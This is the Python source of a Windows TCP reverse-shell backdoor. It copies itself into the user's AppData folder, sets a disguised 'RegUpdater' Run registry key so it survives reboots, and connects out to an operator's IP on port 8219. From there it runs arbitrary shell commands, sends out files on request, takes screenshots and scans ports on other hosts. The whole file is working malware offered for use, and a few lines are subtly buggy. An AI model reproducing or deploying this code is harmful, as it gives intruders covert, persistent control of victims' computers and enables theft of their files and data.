import socket # to establish tcp connection
from subprocess import Popen, PIPE # to run the command in the system
import os
import random
from PIL import ImageGrab
import time
import shutil
import winreg as wreg



#A TCP backdoor reverse shell
#ip = str(input("Enter the IP address of the Server Machine: "))
#To use either uncomment the top line or replace ip with you IP address, Script Kiddies stay away

path = os.getcwd().strip('/n')
#get current working directory where the backdoor gets executed

CMD = Popen('set USERPROFILE', shell=True, stdout=PIPE, stderr=PIPE)
result= CMD.stdout.read().decode('utf-8')

null, userprof = result.split('=')

#Get UserProfile

destination = userprof.strip('\n\r')+ '\\AppData\\Local\\'  + "TCP-Client.exe"
#specify where to copy your backdoor

if not os.path.exists(destination):
    #First time our backdoor is being executed

    #Copy our Backdoor to C:\Users\<username>\AppData\Local
    shutil.copyfile(path + "\\TCP-Client.exe", destination)

    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, wreg.KEY_ALL_ACCESS)

    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    #Create a New Registry called RegUpdater pointing to our new backdoor path
    



ip = input ("Enter Your IP address: ")

def connect():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 8219))


    while True:
        command = s.recv(1024)
        CMD = Popen(command.decode('utf-8'), shell=True, stdout=PIPE, stderr=PIPE)

        if 'grab'.encode('utf-8') in command:
            grab, path = command.split('*'.encode('utf-8'))
            transfer(s,path)
            
        elif 'cd'.encode('utf-8') in command:
            try:
                cd, path = command.split(' '.encode('utf-8'))
                os.chdir(path)
                s.send('[+] Directory has been changed '.encode('utf-8'))
            except:
                s.send("[-] No such directory".encode('utf-8'))

        elif 'scan'.encode('utf-8') in command:
            command = command[5:]
            Ip, ports = command.split(':'.encode('utf-8'))
            scanner(s,Ip,ports)

        elif 'screenshot'.encode('utf-8') in command:
            ImageGrab.grab().save("img.jpg", "JPEG")
            s.send("[+] Screenshot Successfully Taken".encode('utf-8'))


        elif 'terminate'.encode('utf-8') in command:
            s.close() #close the socket
            break

        elif CMD.stdout.read() == b'':
            try:
                s.send("[+] Completed ".encode('utf-8') + "\n".encode('utf-8') + CMD.stdout.read())#send the result
            except:
                s.send(CMD.stderr.read()) #incase you mistyped an error, Resend the error back

        else:
            CMD = Popen(command.decode('utf-8'), shell=True, stdout=PIPE, stderr=PIPE)
            s.send(CMD.stdout.read())#send the result
            s.send(CMD.stderr.read()) #incase you mistyped an error, Resend the error back


def transfer(s, path):
    if os.path.exists(path): #if a path exists for the required transfer
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != ''.encode('utf-8'):
            s.send(packet)  
            packet = f.read(14600)
        s.send('[+] Done'.encode('utf-8'))
        f.close()

    else: #the file doesn't exist
        s.send("[-] Unable to find the file".encode('utf-8'))
        pass

def scanner(s,Ip,ports):
    scan_result = ""
    scan_byte = ''

    for port in ports.split(','.encode('utf-8')):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            output = sock.connect_ex((Ip, int(port)))

            if output == 0:
                s.send("[+] Port %s is opened \n".encode('utf-8') %(port))

            else:
                s.send("[+] Port %s is closed \n".encode('utf-8') %(port) )
            sock.close()

        except Exception as e:
            print(e)
    s.send("{+} Done".encode('utf-8'))

def main():
    while True:
        try:
            connect()
            continue
        except Exception as e:
            sleep_for = random.randrange(1,10)
            time.sleep(sleep_for) #sleep for a random time between 1-10 seco>
            main()

if __name__ == "__main__":
    main()
